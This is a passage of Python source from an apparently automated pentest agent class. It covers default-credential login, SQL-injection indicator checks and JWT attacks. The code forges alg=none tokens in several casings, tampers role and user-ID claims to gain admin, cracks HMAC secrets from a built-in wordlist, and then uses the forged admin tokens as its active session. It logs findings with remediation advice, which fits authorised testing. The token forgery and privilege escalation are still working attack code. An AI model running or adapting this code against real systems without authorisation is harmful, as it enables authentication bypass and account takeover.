                    "username": successful_cred[0],
                    "password_hint": successful_cred[1][:3] + "***",
                    "endpoint": self._login_endpoint,
                    "impact": "Unauthorized access using default credentials",
                },
                remediation="Force password change on first login. Implement password complexity requirements. "
                            "Remove or disable default accounts.",
            )

            self.state.add_to_attack_chain(
                step_name="Default Credentials Login",
                description=f"Logged in with default credentials: {successful_cred[0]}",
                result="Access obtained with default credentials",
                data_obtained={"username": successful_cred[0]},
            )

            logger.info("  Default credentials recorded as HIGH finding.")
        else:
            logger.info("  No common/default credentials worked.")

    # ═══════════════════════════════════════════════
    #  CORE HELPER ── TRY SINGLE LOGIN
    # ═══════════════════════════════════════════════

    async def _try_single_login(
        self, identifier: str, password: str, source: str = "unknown"
    ) -> Optional[Dict[str, Any]]:
        """
        Attempt a single login request.
        Returns dict with {success, token, response_data} or None on error.
        """
        if not self._login_endpoint:
            return None

        templates_to_try = []
        if self._login_body_template:
            templates_to_try.append(self._login_body_template)
        else:
            templates_to_try.extend(LOGIN_BODY_TEMPLATES[:3])  # Try top 3 formats

        for template in templates_to_try:
            body = self._fill_login_template(template, identifier=identifier, password=password)

            try:
                resp = await self.http.post(self._login_endpoint, json=body)
                self.state.increment_requests()

                token = self._extract_token_from_response(resp)

                # ── Success detection ──
                if resp.status_code == 200 and token:
                    is_admin = self._check_if_admin_token(token)

                    if is_admin:
                        self._admin_token = token
                        logger.info(f"  ★ ADMIN token captured via {source}!")
                    elif not self._user_token:
                        self._user_token = token

                    # Set on HTTP client
                    self.http.set_auth_token(token, token_type="Bearer")

                    # Save credential
                    self.state.add_credential(
                        credential_type="discovered" if source != "common_creds" else "default",
                        username=identifier,
                        password=password,
                        source=source,
                        is_admin=is_admin,
                        extra_data={
                            "login_endpoint": self._login_endpoint,
                            "token_preview": token[:50] if token else None,
                        },
                    )

                    # Save token
                    self.state.add_token({
                        "token_value": token,
                        "token_type": "jwt" if self._looks_like_jwt(token) else "session",
                        "source": source,
                        "associated_user": identifier,
                        "is_admin": is_admin,
                    })

                    if is_admin:
                        self.state.set_active_session(
                            token=token, session_type="jwt" if self._looks_like_jwt(token) else "cookie"
                        )

                    self._results["tokens"].append({
                        "token": token[:50] + "..." if len(token) > 50 else token,
                        "full_token": token,
                        "type": "admin" if is_admin else "user",
                        "source": source,
                        "user": identifier,
                    })

                    return {
                        "success": True,
                        "token": token,
                        "is_admin": is_admin,
                        "identifier": identifier,
                        "source": source,
                    }

                elif resp.status_code == 200 and not token:
                    # Check cookies
                    cookies = self.http.get_cookies()
                    if cookies:
                        self.state.add_credential(
                            credential_type="discovered",
                            username=identifier,
                            password=password,
                            source=source,
                            is_admin=False,
                            extra_data={"session": "cookie_based"},
                        )
                        return {
                            "success": True,
                            "token": "cookie_based",
                            "is_admin": False,
                            "identifier": identifier,
                            "source": source,
                        }

                # ── SQLi indicator detection (even on non-200) ──
                if resp.has_sqli_indicators():
                    sqli_details = resp.get_sqli_details()
                    logger.info(f"  ⚠ SQLi indicators detected: {sqli_details[:2]}")
                    self.state.add_finding(
                        finding_type="potential",
                        category="sqli",
                        severity="high",
                        title="SQL Injection Indicators on Login",
                        description=f"SQL error indicators found when testing login with payload: {identifier[:50]}",
                        endpoint=self._login_endpoint,
                        evidence={
                            "payload": identifier,
                            "indicators": sqli_details[:5],
                            "status_code": resp.status_code,
                        },
                        remediation="Use parameterized queries for all database operations.",
                    )

                # ── Error-based info leak ──
                if resp.has_error_indicators():
                    error_details = resp.get_error_details()
                    if error_details:
                        logger.info(f"  ⚠ Error info leak: {error_details[0][:100]}")
                        self.state.add_finding(
                            finding_type="potential",
                            category="info_leak",
                            severity="medium",
                            title="Error Information Disclosure on Login",
                            description=f"Detailed error messages returned from login endpoint.",
                            endpoint=self._login_endpoint,
                            evidence={
                                "errors": error_details[:3],
                                "trigger_payload": identifier[:50],
                            },
                            remediation="Return generic error messages. Do not expose stack traces or SQL errors.",
                        )

            except Exception as e:
                logger.debug(f"  Login attempt error: {e}")

        return None

    def _check_if_admin_token(self, token: str) -> bool:
        """Decode a JWT token and check if it belongs to an admin user."""
        if not self._looks_like_jwt(token):
            return False

        try:
            decoded = self._decode_jwt(token)
            if not decoded:
                return False

            payload_data = decoded.get("payload", {})

            # Check various admin indicators
            role = str(payload_data.get("role", "")).lower()
            if role in ("admin", "administrator", "superadmin", "root"):
                return True

            is_admin_field = payload_data.get("isAdmin", payload_data.get("is_admin", None))
            if is_admin_field is True or str(is_admin_field).lower() == "true":
                return True

            email = str(payload_data.get("email", payload_data.get("sub", ""))).lower()
            if "admin" in email:
                return True

            user_id = payload_data.get("id", payload_data.get("userId", payload_data.get("user_id", None)))
            if user_id is not None and str(user_id) == "1":
                return True

            permissions = payload_data.get("permissions", payload_data.get("scope", []))
            if isinstance(permissions, list):
                for perm in permissions:
                    if "admin" in str(perm).lower():
                        return True
            elif isinstance(permissions, str) and "admin" in permissions.lower():
                return True

        except Exception as e:
            logger.debug(f"  Admin check error: {e}")

        return False

    # ═══════════════════════════════════════════════
    #  STEP 6 ── JWT TOKEN ANALYSIS
    # ═══════════════════════════════════════════════

    async def _analyze_all_tokens(self) -> None:
        """Analyse all captured JWT tokens for vulnerabilities."""
        tokens_to_analyze: List[Dict[str, Any]] = []

        for token_entry in self._results.get("tokens", []):
            full_token = token_entry.get("full_token", "")
            if full_token and full_token != "cookie_based" and self._looks_like_jwt(full_token):
                tokens_to_analyze.append(token_entry)

        # Also check state for any tokens we might have missed
        state_tokens = self.state.get_discovered_tokens()
        for st in state_tokens:
            tv = st.get("token_value", "")
            if tv and self._looks_like_jwt(tv):
                already_added = any(t.get("full_token") == tv for t in tokens_to_analyze)
                if not already_added:
                    tokens_to_analyze.append({"full_token": tv, "type": st.get("token_type", "unknown"), "source": st.get("source", "state")})

        if not tokens_to_analyze:
            logger.info("  No JWT tokens to analyse.")
            return

        logger.info(f"  Analysing {len(tokens_to_analyze)} JWT token(s)...")

        for idx, token_entry in enumerate(tokens_to_analyze):
            full_token = token_entry.get("full_token", "")
            token_source = token_entry.get("source", "unknown")
            token_type = token_entry.get("type", "unknown")

            logger.info(f"  Token {idx + 1}: source={token_source}, type={token_type}")

            analysis = await self._analyze_jwt_token(full_token)
            analysis["source"] = token_source
            analysis["token_type"] = token_type
            self._results["jwt_analysis"].append(analysis)

    async def _analyze_jwt_token(self, token: str) -> Dict[str, Any]:
        """Deep analysis of a single JWT token."""
        analysis: Dict[str, Any] = {
            "decoded": None,
            "vulnerabilities": [],
            "info": {},
        }

        # ── Decode the token ──
        decoded = self._decode_jwt(token)
        if not decoded:
            logger.warning("  Could not decode JWT token.")
            analysis["error"] = "decode_failed"
            return analysis

        analysis["decoded"] = decoded
        header = decoded.get("header", {})
        payload_data = decoded.get("payload", {})

        # ── Extract useful information ──
        info: Dict[str, Any] = {}
        info["algorithm"] = header.get("alg", "unknown")
        info["token_type"] = header.get("typ", "unknown")

        info["user_id"] = payload_data.get("id", payload_data.get("sub", payload_data.get("userId", "unknown")))
        info["email"] = payload_data.get("email", payload_data.get("sub", "unknown"))
        info["role"] = payload_data.get("role", payload_data.get("roles", "unknown"))
        info["is_admin"] = self._check_if_admin_token(token)

        # Expiration
        exp = payload_data.get("exp")
        if exp:
            try:
                import datetime
                exp_dt = datetime.datetime.fromtimestamp(int(exp), tz=datetime.timezone.utc)
                info["expires_at"] = exp_dt.isoformat()
                info["is_expired"] = exp_dt < datetime.datetime.now(tz=datetime.timezone.utc)
                remaining = exp_dt - datetime.datetime.now(tz=datetime.timezone.utc)
                info["expires_in_hours"] = round(remaining.total_seconds() / 3600, 2)
            except Exception:
                info["expires_at"] = str(exp)
                info["is_expired"] = "unknown"

        iat = payload_data.get("iat")
        if iat:
            try:
                import datetime
                iat_dt = datetime.datetime.fromtimestamp(int(iat), tz=datetime.timezone.utc)
                info["issued_at"] = iat_dt.isoformat()
            except Exception:
                info["issued_at"] = str(iat)

        info["all_claims"] = list(payload_data.keys())
        analysis["info"] = info

        logger.info(f"    Algorithm: {info['algorithm']}")
        logger.info(f"    User: {info.get('email', 'N/A')} (ID: {info.get('user_id', 'N/A')})")
        logger.info(f"    Role: {info.get('role', 'N/A')}")
        logger.info(f"    Is Admin: {info.get('is_admin', False)}")

        # ── Vulnerability 1: "none" algorithm ──
        none_vuln = await self._test_jwt_none_algorithm(token, decoded)
        if none_vuln:
            analysis["vulnerabilities"].append(none_vuln)

        # ── Vulnerability 2: Role tampering ──
        role_vuln = await self._test_jwt_role_tampering(token, decoded)
        if role_vuln:
            analysis["vulnerabilities"].append(role_vuln)

        # ── Vulnerability 3: Weak secret ──
        secret_vuln = await self._test_jwt_weak_secret(token)
        if secret_vuln:
            analysis["vulnerabilities"].append(secret_vuln)

        # ── Vulnerability 4: Missing expiration ──
        if not exp:
            no_exp_vuln = {
                "type": "missing_expiration",
                "severity": "medium",
                "description": "JWT token has no expiration claim (exp). Token never expires.",
            }
            analysis["vulnerabilities"].append(no_exp_vuln)

            self.state.add_finding(
                finding_type="confirmed",
                category="jwt",
                severity="medium",
                title="JWT Token Missing Expiration",
                description="JWT token does not contain an expiration (exp) claim. "
                            "The token will remain valid indefinitely.",
                endpoint=self._login_endpoint or self.target_url,
                evidence={"claims": list(payload_data.keys()), "has_exp": False},
                remediation="Always include an exp claim in JWT tokens with a reasonable TTL.",
            )

        # ── Vulnerability 5: Long expiration ──
        if info.get("expires_in_hours") and isinstance(info["expires_in_hours"], (int, float)):
            if info["expires_in_hours"] > 168:  # More than 7 days
                long_exp_vuln = {
                    "type": "long_expiration",
                    "severity": "low",
                    "description": f"JWT token has an extremely long expiration: {info['expires_in_hours']} hours.",
                }
                analysis["vulnerabilities"].append(long_exp_vuln)

                self.state.add_finding(
                    finding_type="potential",
                    category="jwt",
                    severity="low",
                    title="JWT Token with Long Expiration",
                    description=f"JWT token expires in {info['expires_in_hours']} hours ({round(info['expires_in_hours']/24, 1)} days). "
                                f"Long-lived tokens increase the window for token theft.",
                    endpoint=self._login_endpoint or self.target_url,
                    evidence={"expires_in_hours": info["expires_in_hours"]},
                    remediation="Set JWT token expiration to a reasonable value (e.g. 1-24 hours). Use refresh tokens for long sessions.",
                )

        # ── Vulnerability 6: Sensitive data in token ──
        sensitive_keys = ["password", "passwd", "secret", "ssn", "credit_card", "cc_number"]
        found_sensitive = [k for k in payload_data.keys() if k.lower() in sensitive_keys]
        if found_sensitive:
            sensitive_vuln = {
                "type": "sensitive_data_in_token",
                "severity": "high",
                "description": f"JWT token contains sensitive data fields: {found_sensitive}",
            }
            analysis["vulnerabilities"].append(sensitive_vuln)

            self.state.add_finding(
                finding_type="confirmed",
                category="jwt",
                severity="high",
                title="Sensitive Data in JWT Token",
                description=f"JWT token contains sensitive fields: {found_sensitive}. "
                            f"JWTs are base64-encoded (not encrypted) and can be decoded by anyone.",
                endpoint=self._login_endpoint or self.target_url,
                evidence={"sensitive_fields": found_sensitive},
                remediation="Never store sensitive data in JWT tokens. JWTs are not encrypted by default.",
            )

        if analysis["vulnerabilities"]:
            logger.info(f"    Found {len(analysis['vulnerabilities'])} JWT vulnerabilities!")
        else:
            logger.info("    No JWT vulnerabilities found.")

        return analysis

    # ─────────────────────────────────────────────
    #  JWT Sub-Tests
    # ─────────────────────────────────────────────

    def _decode_jwt(self, token: str) -> Optional[Dict[str, Any]]:
        """Decode a JWT token without verification."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            # Decode header
            header_b64 = parts[0]
            # Add padding
            header_b64 += "=" * (4 - len(header_b64) % 4)
            header_bytes = base64.urlsafe_b64decode(header_b64)
            header = json.loads(header_bytes)

            # Decode payload
            payload_b64 = parts[1]
            payload_b64 += "=" * (4 - len(payload_b64) % 4)
            payload_bytes = base64.urlsafe_b64decode(payload_b64)
            payload_data = json.loads(payload_bytes)

            return {
                "header": header,
                "payload": payload_data,
                "signature": parts[2],
                "raw_parts": parts,
            }
        except Exception as e:
            logger.debug(f"  JWT decode error: {e}")
            return None

    def _forge_jwt_none(self, payload_data: Dict[str, Any]) -> str:
        """Create a JWT with alg=none (no signature)."""
        header = {"alg": "none", "typ": "JWT"}

        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload_data, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

        return f"{header_b64}.{payload_b64}."

    def _forge_jwt_modified_payload(self, token: str, modifications: Dict[str, Any]) -> Optional[str]:
        """Take an existing JWT and modify its payload, keeping original header and empty signature."""
        decoded = self._decode_jwt(token)
        if not decoded:
            return None

        header = decoded["header"]
        payload_data = dict(decoded["payload"])
        payload_data.update(modifications)

        # Use "none" algorithm to bypass signature
        header["alg"] = "none"

        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload_data, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

        return f"{header_b64}.{payload_b64}."

    async def _test_jwt_none_algorithm(self, token: str, decoded: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test if the server accepts JWT tokens with alg=none."""
        logger.info("    Testing JWT 'none' algorithm vulnerability...")

        payload_data = decoded.get("payload", {})

        # Create tokens with various "none" algorithm headers
        none_variants = [
            {"alg": "none", "typ": "JWT"},
            {"alg": "None", "typ": "JWT"},
            {"alg": "NONE", "typ": "JWT"},
            {"alg": "nOnE", "typ": "JWT"},
        ]

        for variant_header in none_variants:
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(variant_header, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload_data, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()

            # Try with empty signature and without trailing dot
            forged_tokens = [
                f"{header_b64}.{payload_b64}.",
                f"{header_b64}.{payload_b64}..",
                f"{header_b64}.{payload_b64}",
            ]

            for forged in forged_tokens:
                accepted = await self._test_token_accepted(forged)
                if accepted:
                    logger.info(f"    ✓✓✓ JWT 'none' algorithm ACCEPTED! alg={variant_header['alg']}")

                    self.state.add_finding(
                        finding_type="confirmed",
                        category="jwt",
                        severity="critical",
                        title="JWT 'none' Algorithm Vulnerability",
                        description=f"Server accepts JWT tokens with algorithm set to '{variant_header['alg']}'. "
                                    f"This allows attackers to forge arbitrary tokens without knowing the secret.",
                        endpoint=self._login_endpoint or self.target_url,
                        evidence={
                            "accepted_algorithm": variant_header["alg"],
                            "forged_token_preview": forged[:80],
                            "impact": "Complete authentication bypass - any token can be forged",
                        },
                        remediation="Explicitly validate the JWT algorithm on the server side. "
                                    "Reject tokens with alg=none. Use a whitelist of allowed algorithms.",
                    )

                    return {
                        "type": "none_algorithm",
                        "severity": "critical",
                        "description": f"Server accepts JWT with alg={variant_header['alg']}",
                        "accepted_variant": variant_header["alg"],
                    }

        logger.info("    'none' algorithm not accepted.")
        return None

    async def _test_jwt_role_tampering(self, token: str, decoded: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test if modifying role/admin claims in JWT is accepted."""
        logger.info("    Testing JWT role tampering...")

        payload_data = decoded.get("payload", {})

        # Various role escalation modifications to try
        modifications_list: List[Dict[str, Any]] = [
            {"role": "admin"},
            {"role": "administrator"},
            {"isAdmin": True},
            {"is_admin": True},
            {"admin": True},
            {"permissions": ["admin", "read", "write", "delete"]},
            {"scope": "admin"},
        ]

        # Also try setting user ID to 1 (often admin)
        if payload_data.get("id") and str(payload_data["id"]) != "1":
            modifications_list.append({"id": 1})
        if payload_data.get("userId") and str(payload_data["userId"]) != "1":
            modifications_list.append({"userId": 1})
        if payload_data.get("sub") and str(payload_data["sub"]) != "1":
            modifications_list.append({"sub": "1"})

        for modifications in modifications_list:
            forged_token = self._forge_jwt_modified_payload(token, modifications)
            if not forged_token:
                continue

            accepted = await self._test_token_accepted(forged_token)
            if accepted:
                logger.info(f"    ✓✓✓ JWT role tampering ACCEPTED! Modification: {modifications}")

                self.state.add_finding(
                    finding_type="confirmed",
                    category="jwt",
                    severity="critical",
                    title="JWT Role Tampering Vulnerability",
                    description=f"Server accepts JWT tokens with modified payload claims. "
                                f"Modification: {json.dumps(modifications)} was accepted.",
                    endpoint=self._login_endpoint or self.target_url,
                    evidence={
                        "modification": modifications,
                        "forged_token_preview": forged_token[:80],
                        "original_claims": {k: str(v)[:50] for k, v in payload_data.items()},
                        "impact": "Privilege escalation - any user can become admin",
                    },
                    remediation="Always verify JWT signatures on the server. Never trust claims "
                                "from the token without signature verification.",
                )

                # If this gives us admin, save the token
                self._admin_token = forged_token
                self.http.set_auth_token(forged_token, token_type="Bearer")

                self.state.add_token({
                    "token_value": forged_token,
                    "token_type": "jwt_forged",
                    "source": "role_tampering",
                    "associated_user": "forged_admin",
                    "is_admin": True,
                })

                self._results["tokens"].append({
                    "token": forged_token[:50] + "...",
                    "full_token": forged_token,
                    "type": "admin_forged",
                    "source": "jwt_role_tampering",
                    "user": "forged_admin",
                })

                self.state.add_to_attack_chain(
                    step_name="JWT Role Tampering",
                    description=f"Escalated privileges by modifying JWT claims: {modifications}",
                    result="Admin access obtained via forged JWT",
                    data_obtained={"modification": str(modifications)},
                )

                return {
                    "type": "role_tampering",
                    "severity": "critical",
                    "description": f"Server accepts modified JWT with: {modifications}",
                    "modification": modifications,
                }

        logger.info("    Role tampering not accepted.")
        return None

    async def _test_jwt_weak_secret(self, token: str) -> Optional[Dict[str, Any]]:
        """Test if the JWT was signed with a common/weak secret."""
        logger.info("    Testing JWT weak secret...")

        try:
            import hmac
            import hashlib
        except ImportError:
            logger.debug("  hmac/hashlib not available for weak secret test")
            return None

        parts = token.split(".")
        if len(parts) != 3:
            return None

        signing_input = f"{parts[0]}.{parts[1]}".encode()
        original_sig = parts[2]

        # Get common secrets from PayloadEngine
        common_secrets: List[str] = []
        try:
            common_secrets = self.payloads.get_jwt_secrets()
        except Exception:
            pass

        # Fallback manual list if PayloadEngine doesn't return enough
        manual_secrets = [
            "secret", "password", "123456", "key", "jwt_secret",
            "super_secret", "changeme", "default", "jwt", "token",
            "mysecret", "s3cr3t", "passw0rd", "admin", "test",
            "your-256-bit-secret", "my-secret-key", "shhhhh",
            "keyboard cat", "gfg_jwt_secret_key", "node_jwt_secret",
        ]

        all_secrets = list(set(common_secrets + manual_secrets))

        found_secret = None

        for secret in all_secrets:
            try:
                # Compute HMAC-SHA256
                computed = hmac.new(
                    secret.encode(), signing_input, hashlib.sha256
                ).digest()
                computed_b64 = base64.urlsafe_b64encode(computed).rstrip(b"=").decode()

                if computed_b64 == original_sig:
                    found_secret = secret
                    logger.info(f"    ✓✓✓ JWT WEAK SECRET FOUND: '{secret}'")
                    break
            except Exception:
                continue

        if not found_secret:
            # Try HS384 and HS512 too
            hash_funcs = [
                ("HS384", hashlib.sha384),
                ("HS512", hashlib.sha512),
            ]
            for alg_name, hash_func in hash_funcs:
                if found_secret:
                    break
                for secret in all_secrets[:10]:  # Limit for non-256 algorithms
                    try:
                        computed = hmac.new(
                            secret.encode(), signing_input, hash_func
                        ).digest()
                        computed_b64 = base64.urlsafe_b64encode(computed).rstrip(b"=").decode()
                        if computed_b64 == original_sig:
                            found_secret = secret
                            logger.info(f"    ✓✓✓ JWT WEAK SECRET FOUND ({alg_name}): '{secret}'")
                            break
                    except Exception:
                        continue

        if found_secret:
            self.state.set_jwt_secret(found_secret)

            self.state.add_finding(
                finding_type="confirmed",
                category="jwt",
                severity="critical",
                title="JWT Signed with Weak/Default Secret",
                description=f"JWT token is signed with a weak/default secret: '{found_secret}'. "
                            f"An attacker can forge arbitrary tokens using this secret.",
                endpoint=self._login_endpoint or self.target_url,
                evidence={
                    "secret": found_secret,
                    "impact": "Complete token forgery - attacker can create admin tokens",
                },
                remediation="Use a strong, randomly generated secret of at least 256 bits. "
                            "Store the secret securely (environment variable, secret manager). "
                            "Rotate the secret periodically.",
            )

            self.state.add_to_attack_chain(
                step_name="JWT Weak Secret Discovery",
                description=f"Discovered JWT signing secret: '{found_secret}'",
                result="Can now forge arbitrary JWT tokens",
                data_obtained={"secret": found_secret},
            )

            return {
                "type": "weak_secret",
                "severity": "critical",
                "description": f"JWT signed with weak secret: '{found_secret}'",
                "secret": found_secret,
            }

        logger.info("    No weak secret found (tested common secrets).")
        return None

    async def _test_token_accepted(self, token: str) -> bool:
        """
        Test if a given token is accepted by the server.
        Sends it to common authenticated endpoints and checks for 200.
        """
        # Temporarily set the token
        original_token = self._user_token or self._admin_token
        self.http.set_auth_token(token, token_type="Bearer")

        accepted = False

        verify_paths = [
            "/rest/user/whoami",
            "/api/Users/1",
            "/api/me",
            "/api/profile",
            "/api/v1/me",
        ]

        for path in verify_paths:
            url = urljoin(self.target_url, path)
            try:
                resp = await self.http.get(url)
                self.state.increment_requests()

                if resp.status_code == 200:
                    # Additional check: does the response contain user data?
                    if resp.json_data and isinstance(resp.json_data, dict):
                        accepted = True
                        break
                    elif resp.is_json:
                        accepted = True
                        break

            except Exception:
                pass

        # Restore original token
        if original_token:
            self.http.set_auth_token(original_token, token_type="Bearer")
        else:
            self.http.clear_auth_token()

        return accepted

    # ═══════════════════════════════════════════════
    #  UTILITY METHODS
    # ═══════════════════════════════════════════════

    def get_results(self) -> Dict[str, Any]:
        """Return the current results dictionary."""
        return self._results

    def get_user_token(self) -> Optional[str]:
        """Get the captured user token."""
        return self._user_token

    def get_admin_token(self) -> Optional[str]:
        """Get the captured admin token."""
        return self._admin_token

    def get_registered_email(self) -> Optional[str]:
        """Get the email of the registered test account."""
        return self._registered_email

    def get_registered_password(self) -> str:
        """Get the password of the registered test account."""
        return self._registered_password

    def has_auth(self) -> bool:
        """Check if we have any authentication."""
        return self._user_token is not None or self._admin_token is not None

    def has_admin(self) -> bool:
        """Check if we have admin access."""
        return self._admin_token is not None

    def get_best_token(self) -> Optional[str]:
        """Return admin token if available, otherwise user token."""
        return self._admin_token or self._user_token

    def get_summary(self) -> str:
        """Get a human-readable summary of auth agent results."""
        lines = [
            "═" * 50,
            "  V2 AUTH AGENT SUMMARY",
            "═" * 50,
            f"  Status:        {self._results.get('auth_status', 'unknown')}",
            f"  Login EP:      {self._results['endpoints_discovered'].get('login', 'not found')}",
            f"  Register EP:   {self._results['endpoints_discovered'].get('register', 'not found')}",
        ]

        reg = self._results.get("registered_account")
        if reg:
            lines.append(f"  Registered:    {reg.get('email', 'N/A')}")
        else:
            lines.append("  Registered:    Failed / Not attempted")

        lines.append(f"  Tokens:        {len(self._results.get('tokens', []))}")
        lines.append(f"  SQLi Bypass:   {'YES ✓' if self._results.get('sqli_bypass') else 'No'}")
        lines.append(f"  Default Creds: {'YES ✓' if self._results.get('common_creds_bypass') else 'No'}")
        lines.append(f"  Findings:      {len(self._results.get('findings', []))}")

        jwt_analyses = self._results.get("jwt_analysis", [])
        total_jwt_vulns = sum(len(a.get("vulnerabilities", [])) for a in jwt_analyses)
        lines.append(f"  JWT Vulns:     {total_jwt_vulns}")

        if self._admin_token:
            lines.append("  ★ ADMIN ACCESS OBTAINED ★")

        lines.append("═" * 50)
        return "\n".join(lines)

    def __repr__(self) -> str:
        return (
            f"V2AuthAgent(target={self.target_url}, "
            f"status={self._results.get('auth_status', 'unknown')}, "
            f"has_auth={self.has_auth()}, "
            f"has_admin={self.has_admin()})"
        )